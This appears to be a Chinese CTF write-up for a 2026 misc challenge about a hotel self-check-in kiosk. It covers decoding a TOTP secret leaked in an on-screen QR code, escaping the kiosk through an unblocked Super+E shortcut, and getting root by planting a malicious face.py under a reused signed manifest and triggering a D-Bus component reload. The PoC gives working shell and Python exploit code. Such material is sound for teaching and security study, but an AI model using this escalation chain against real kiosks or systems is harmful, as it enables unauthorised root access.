---
title: 'Misc2-0perator'
contest: '强网杯 2026 第十届'
contest_normalized: '强网杯 2026 第十届'
contest_year: 2026
year: 2026
category: 'misc'
subcategory: 'misc_other'
tags: []
attack_chain:
- '题目信息'
- '题目分析'
- '个安全域'
- '，口令认证'
- '解题过程'
- '维码泄漏的动态令牌密钥'
one_liner: '1. 题目信息'
lesson: ''
quality: 'medium'
schema_version: 'v3.0.0-P0'
source_type: 'wechat_article'
source_url: 'https://mp.weixin.qq.com/s/onGfTPOi9N7Ak9UWWmMNoA'
last_verified: '2026-11-02'
flag_observed:
- 'flag{动态容器已脱敏}'
contest_normalized: "强网杯"
subcategory_guess: "misc_misc"
---

Misc2-0perator
1. 题目信息
项目
内容
分类
Misc
形态
容器题（VNC远程桌面）
附件
无
目标
读取/root/flag.txt
Flag：flag{动态容器已脱敏}
题面：酒店的大堂自助入住机疑似存在漏洞，需要展开调查。
2. 题目分析
目标形态
用
nc
连上题目入口，得到的是VNC服务的握手（
RFB 003.008
），不是普通交互程序。VNC桌面是一台Chromium kiosk自助入住机：
应用标题：
Qiangwang Cup Hotel — SELF CHECK-IN · POWERED BY OPERATOR
设备编号：
KIOSK-07
会话：Xvfb
:<端口>
+
x11vnc
（root运行）+xfwm4/xfsettingsd（XFCE）
后端：Flask（
<靶机地址>
，kiosk用户）+root设备管理器（D-Bus）
攻击链总览
屏幕二维码泄漏TOTP密钥
│
▼
kiosk逃逸：Super+E → Thunar → Open Terminal Here → shell(kiosk)
│
▼
设备管理器组件覆盖机制被滥用
① /var/lib/0perator/components/user  kiosk可写
② python组件验签include_sha256=False（签名不绑内容）
③ /run/0perator/face.status  kiosk可写 → 置disabled
④ D-Bus ReloadComponents允许kiosk调用
│
▼
root设备管理器加载我方face.py → root执行 → 复制/root/flag.txt
入住机业务流（
/totp
→
/checkin
→
/face/start
）并不是入口：样例环境没有摄像头，人脸核验必然失败。真正可利用的是“桌面逃逸+组件覆盖”这条链。
三个安全域
机器把顾客界面与特权逻辑拆成三层：
安全域
进程
身份
暴露面
业务
app.py
kiosk
仅
<靶机地址>
展示
Xvfb/x11vnc/xfwm4
服务root，会话kiosk
5900，口令认证
设备
manager.py
root
系统总线
org.operator.DeviceManager
设计假设是：顾客只碰得到浏览器，kiosk即使被拿下也只是普通用户，D-Bus调用方可信。裂缝在于桌面会话本身就以kiosk身份可交互，而覆盖目录与降级开关都落在kiosk可写处。链能走通不是某行代码写错，是三个假设同时失效。
加载契约
管理器的职责是“把组件装进自己的进程”，分三段：发现（厂商目录与覆盖目录按
id
归并，覆盖优先）、验签（用
component-signing.pub
校验清单
signature
）、装载（
python
走
importlib
导入
entry
并回调
on_load
，
native
走动态库）。危险在二、三段接缝：验签查的是清单，装载读的是
entry
指名的另一个文件，签名对象与执行对象分离后，签名退化成“目录准入标签”。叠加可写覆盖目录、可写降级开关、无鉴权重载，契约被按“写入→使能→触发→root装载”逐一击穿。
3. 解题过程
二维码泄漏的动态令牌密钥
首屏是「手机动态码验证」，屏幕上直接画着一个绑定二维码。对VNC画面截图后交给OpenCV的
QRCodeDetector
解码，得到：
otpauth://totp/0perator:KIOSK-07?secret=ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF&issuer=0perator
漏洞在于：TOTP密钥
ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF
直接印在自助机屏幕上（issuer用数字0冒充字母O），任何人扫码即可无限生成6位动态码，“手机绑定+动态口令”形同虚设。
为什么密钥泄漏就等于失守：TOTP是对称的，服务端与令牌端持有同一secret，各算
HMAC-SHA1(secret, floor(now/30))
再动态截断取6位；secret本身即凭证，所谓“手机”只是它的存放处，把绑定二维码长期画在公共屏幕上等于公开第二因素（issuer用数字0只是品牌混淆）。
pattern
是浏览器端格式拦截，服务端只做数值比对，绕过无收益；之后靠cookie里的会话标记串联，业务流可脚本驱动。
拿到密钥后按标准TOTP（HMAC-SHA1、30秒步长、6位、Base32解码）在本地生成动态码，提交到
POST /totp
（前端
pattern="[0-9]{6,7}"
只是格式校验）。会话用cookie
session=eyJ0b3RwX29r…
维持。业务流后续字段：
步骤
请求
字段
动态码
POST /totp
code
入住人信息
POST /checkin
full_name
/
id_number
/
phone
/
note
人脸核验
POST /face/start
viewport
/face/start
恒返回“未识别到人脸→摄像头未能完成人脸核验”，房间永远停在「待分配」，所以继续走业务流程没有意义，转向桌面逃逸。
kiosk逃逸
启动脚本
/opt/0perator/scripts/start-kiosk.sh
把少数XFCE全局快捷键改成了
true
来“中和”它们：
xfconf-query -c xfce4-keyboard-shortcuts -p
"/commands/custom/<Primary><Alt>t"
-s
"true"
xfconf-query -c xfce4-keyboard-shortcuts -p
"/commands/custom/<Alt>F2"
-s
"true"
xfconf-query -c xfce4-keyboard-shortcuts -p
"/commands/custom/<Primary><Alt>Delete"
-s
"true"
xfconf-query -c xfce4-keyboard-shortcuts -p
"/commands/custom/<Super>"
-s
"true"
<Super>e
（Thunar）不在中和列表里。于是：
Super+E  →  弹出Thunar文件管理器（当前用户kiosk，可浏览整个根文件系统）
右键 → Open Terminal Here  →  xfce4-terminal：kiosk@engine-1
这一步拿到的是kiosk用户的完整shell，后续所有利用都在这个shell里完成。
因果上：浏览器层确实被封死（地址栏、
Ctrl+Shift+I
、右键菜单、
F11
），但键盘事件的消费方不止浏览器。xfwm4在更外层分发全局快捷键，
<Super>e
直接由它绑定到
thunar
，浏览器收不到这个按键，改页面JS也堵不住。启动脚本是黑名单式中和（
<Primary><Alt>t
、
<Alt>F2
、
<Primary><Alt>Delete
、
<Super>
），漏项即漏洞。而Thunar的价值是“在当前目录开终端”，把图形界面一步变成kiosk shell——此后写文件、发D-Bus消息都只能靠它，所以这一步是枢纽而非便利。
环境测绘
进程与监听情况：
pid  1  root   /bin/bash /opt/0perator/scripts/entrypoint.sh --stage2
pid 21  root   /usr/bin/python3 /opt/0perator/device_manager/manager.py     ← 设备管理器
pid 24  root   nginx: master process nginx -g daemon off;
pid 29  www-data nginx: worker process
pid 27  kiosk  /opt/venv/bin/python /opt/0perator/app/app.py                ← 入住机后端
pid 495 root   Xvfb :<端口> -screen 0 1280x800x24
pid 641 root   x11vnc -display :<端口> -forever -shared -noclipboard -noremote -rfbauth /etc/x11vnc.pass -rfbport 5900
监听：
<靶机地址>
（Flask）、
<靶机地址>
（nginx静态站，
/opt/0perator/support/html
+
/downloads/
）、
<靶机地址>
（x11vnc）。
注意目录名是数字零开头的
/opt/0perator
，不是字母o的
/opt/operator
。
80端口的「GUEST SUPPORT / FACE-0x07」页面提供现场诊断包
/downloads/0perator-diag.zip
：
0perator-diag.zip
├─ device-manager.log   管理器初始组件状态
├─ components.json      组件清单
├─ field-service.md     现场服务指南
└─ system-info.txt      hostname/kernel/python/user_override_dir
field-service.md
把设计缺陷写得明明白白：
- Vendor components: `/usr/share/0perator/components`
- Field overrides:  `/var/lib/0perator/components/user`
Field overrides take precedence when the matching vendor component is degraded.
The `user` directory is writable by the kiosk service account so on-site staff
can drop a replacement component without reinstalling the terminal.
components.json
给出两个组件：
face-recognition
（3.2.1，type
python
）与
printer-driver
（1.4.0，type
native
）。
device-manager.log
暴露了
user_override_dir
与
face_disabled
两个状态字段。
诊断包把该看的东西直接交到手上：
components.json
说明组件有两种
type
，决定后面挑哪个下手；
device-manager.log
的
user_override_dir
与
face_disabled
提前暴露覆盖路径与健康判定；
system-info.txt
确认该目录归属kiosk。
field-service.md
则说明两条需求——覆盖目录须kiosk可写、覆盖只在厂商件降级时生效。需求合理，实现却把“可写”与“生效条件”一起交给了低权限侧，这就是分支能被翻转的根源。
提权原理
设备管理器
/opt/0perator/device_manager/manager.py
的常量：
BUS_NAME    =
"org.operator.DeviceManager"
OBJECT_PATH =
"/org/operator/DeviceManager"
IFACE       =
"org.operator.DeviceManager1"
VENDOR_DIR  = os.environ.get(
"COMPONENT_VENDOR_DIR"
,
"/usr/share/0perator/components"
)
USER_DIR    = os.environ.get(
"COMPONENT_USER_DIR"
,
"/var/lib/0perator/components/user"
)
PUBKEY      = os.environ.get(
"COMPONENT_PUBKEY"
,
"/etc/0perator/component-signing.pub"
)
FACE_STATUS = os.environ.get(
"FACE_STATUS_PATH"
,
"/run/0perator/face.status"
)
## component installation is not exposed over D-Bus,
## but field overrides are read from a kiosk-writable directory.
对外只暴露三个无参方法：
GetStatus
、
ListComponents
、
ReloadComponents
。
组件加载逻辑在
component_loader.py
：
def
_face_disabled
(self)
-> bool:
try
:
return
self.face_status_path.read_text(encoding=
"utf-8"
).strip() ==
"disabled"
except
OSError:
return
False
for
component_id, (directory, manifest)
in
vendor.items():
if
component_id
in
user:
override_dir, override_manifest = user[component_id]
if
component_id ==
"face-recognition"
and
not
self._face_disabled():
# Field override is only activated for a failed face component.
self.log.info(
"face override present but face component is healthy; using vendor component"
)
self._load_component(directory, manifest, source=
"vendor"
)
else
:
self._load_component(override_dir, override_manifest, source=
"user-override"
)
验签分两种：
## python组件：importlib加载entry，仅校验清单签名，不绑内容哈希
if
not
verify_manifest(manifest, self.public_key, include_sha256=
False
):
self.failures[component_id] =
"signature"
## native组件：额外用清单里的sha256钉住.so
if
not
verify_manifest(manifest, self.public_key, include_sha256=
True
):
self.failures[component_id] =
"signature"
四个缺陷叠起来就是一条root代码执行链：
/var/lib/0perator/components/user
权限为
drwxr-xr-x kiosk kiosk
，kiosk可写；
python组件
include_sha256=False
，签名只覆盖清单字段、不覆盖
entry
文件内容，可以复用厂商已签名清单、只替换
face.py
；
降级开关
/run/0perator/face.status
位于kiosk可写的
/run
下，写入
disabled
就能让管理器走
user-override
分支；
D-Bus策略允许
user="kiosk"
调用
ReloadComponents
，无鉴权。
按因果顺序把这四点摊开：
可写目录决定“能放东西”
：装载读的是文件系统而非数据库，能在覆盖目录造出同
id
的子目录，管理器就会把它列为候选。
验签范围决定“能否过检”
：
include_sha256=False
对python组件只比对清单字段与签名是否匹配公钥，不看
entry
文件哈希；
native
组件用
include_sha256=True
把
.so
钉住，所以同一手法对
printer-driver
无效——这是必须选
face-recognition
的直接原因。
使能条件决定“候选会被选中”
：只有
not self._face_disabled()
成立时才退回厂商件，而该判断只读
/run/0perator/face.status
是否为
disabled
，
/run
可写，健康判定因此被低权限侧篡改。
调用权限决定“谁能触发”
：
ReloadComponents
无入参、无鉴权，策略放行
user="kiosk"
，一条
dbus-send
就能让root进程重走装载。
四者缺一不可：没有可写目录只能看不能改；签名绑内容则替换
face.py
必然失败；改不了状态则覆盖件被健康判定挡回；调不动重载只能等重启。凑齐后，攻击者做的是“借厂商的合法签名，装载自己的代码”。
利用
(1)复制厂商已签名清单
在kiosk可写目录下建一个与厂商同名的
face-recognition
目录，把厂商
manifest.json
原样复制过去。清单里只有这些字段被签名：
{
"id"
:
"face-recognition"
,
"version"
:
"3.2.1"
,
"vendor"
:
"0perator"
,
"type"
:
"python"
,
"entry"
:
"face.py"
,
"signature"
:
"i5V8oH0ASlvImhI/n4zlGmDkL0mablr39hPFu5DNxtOWIJzTQH…"
}
为什么复制而不是自己写一份：私钥不在容器里，签名无法伪造，清单任何一个被签字段改动都会验签失败。而复用原件时，签名不覆盖
entry
内容这一点使清单一个字节都不必改——
entry
仍然写着
face.py
，我方只要在同一目录放一个同名文件，验签通过、装载路径也指向它。这是整条链里最省的一步，也是缺陷②的直接兑现。
(2)放载荷
face.py
同名替换
entry
指向的
face.py
。管理器用
importlib
加载entry后调用
on_load(ctx)
，模块级代码在导入时即以root执行，所以载荷写在模块顶层也能生效：
import
os
os.system(
"cp /root/flag.txt /home/kiosk/flag.txt; chmod 644 /home/kiosk/flag.txt; id > /home/kiosk/pwn.txt"
)
def
on_load
(ctx)
:
return
None
执行时机值得说清：装载发生在管理器自己的进程里，
importlib
导入
entry
时就会执行模块顶层语句，
on_load(ctx)
只是装载后的回调，所以载荷不实现
on_load
也会在那个时刻以root跑完；写空实现只是让契约正常、避免回调报错干扰返回值判断。身份来自管理器进程的uid而非文件属主，kiosk写的文件被执行时仍是root权限。root没有capability也不妨碍读
/root
，因为读自己的目录靠属主位；先复制到
/home/kiosk
再
chmod 644
是为了让kiosk shell直接
cat
。
(3)翻转降级开关并触发重载
mkdir -p /run/0perator
printf
'disabled'
> /run/0perator/face.status
dbus-send --system --
print
-reply --dest=org.operator.DeviceManager \x5c
/org/operator/DeviceManager org.operator.DeviceManager1.ReloadComponents
field-service.md
写的总线名是
org.0perator.DeviceManager
，其中
0perator
以数字开头是非法D-Bus名（会报
is not a valid bus name
），真实名称是
org.operator.DeviceManager
，对象路径
/org/operator/DeviceManager
，接口
org.operator.DeviceManager1
。可以用
dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames
核对。
这三步的顺序不能调换：先建目录与清单（素材就位），再写
face.py
（载荷就位），再置
disabled
（分支使能），最后发重载（动作触发）。若先重载后置状态，管理器读到的仍是“人脸健康”，只会打印“override present but face component is healthy”并装载厂商件，返回里
source
依旧是
vendor
。若只置状态不发重载，则要等到下一次自然重载才生效——重载是唯一让root进程重新执行装载逻辑的入口，这正好是缺陷④的用处。
(4)结果
重载返回：
{
"loaded"
: {
"face-recognition"
: {
"source"
:
"user-override"
,
"type"
:
"python"
,
"entry"
:
"face.py"
,
"version"
:
"3.2.1"
},
"printer-driver"
: {
"source"
:
"vendor"
,
"type"
:
"native"
,
"entry"
:
"printer.so"
,
"version"
:
"1.4.0"
,
"sha256"
:
"2a00784e206d2ff25600bbdcab1d879229c9c81d911646f6fbc86cc678b14b2b"
}},
"failures"
: {},
"face_disabled"
:
true
,
"user_override_dir"
:
"/var/lib/0perator/components/user"
}
source
为
user-override
说明我方组件被加载并执行了。
同时注意
printer-driver
仍是
vendor
且带
sha256
：原生组件按内容哈希钉住，未被波及；
failures
为空表示清单验签通过，两项合起来正好对应“签名合法但内容被换”这一利用条件。
face_disabled: true
确认降级开关已被写入。随后：
$ cat /home/kiosk/pwn.txt
uid=0(root) gid=0(root) groups=0(root)
$ cat /home/kiosk/flag.txt
flag{动态容器已脱敏}
4. PoC
import
base64
import
hashlib
import
hmac
import
struct
import
time
SECRET =
"ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF"
def
totp
(secret: str, digits: int =
6
, period: int =
30
)
-> str:
key = base64.b32decode(secret, casefold=
True
)
counter = struct.pack(
">Q"
, int(time.time()) // period)
digest = hmac.new(key, counter, hashlib.sha1).digest()
offset = digest[
-1
] &
0x0F
value = struct.unpack(
">I"
, digest[offset:offset +
4
])[
0
] &
0x7FFFFFFF
return
str(value %
10
** digits).zfill(digits)
print(totp(SECRET))
import
cv2
img = cv2.imread(
"screen.png"
)
text, _, _ = cv2.QRCodeDetector().detectAndDecode(img)
print(text)
## otpauth://totp/0perator:KIOSK-07?secret=ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF&issuer=0perator
cd
/var/lib/0perator/components/user
mkdir -p face-recognition
cp /usr/share/0perator/components/face/manifest.json face-recognition/manifest.json
cd
/var/lib/0perator/components/user/face-recognition
cat > face.py <<
'PY'
import os
os.system(
"cp /root/flag.txt /home/kiosk/flag.txt; chmod 644 /home/kiosk/flag.txt; id > /home/kiosk/pwn.txt"
)
def on_load(ctx):
return
None
PY
mkdir -p /run/0perator
printf
'disabled'
> /run/0perator/face.status
dbus-send --system --
print
-reply \x5c
--dest=org.operator.DeviceManager \x5c
/org/operator/DeviceManager \x5c
org.operator.DeviceManager1.ReloadComponents
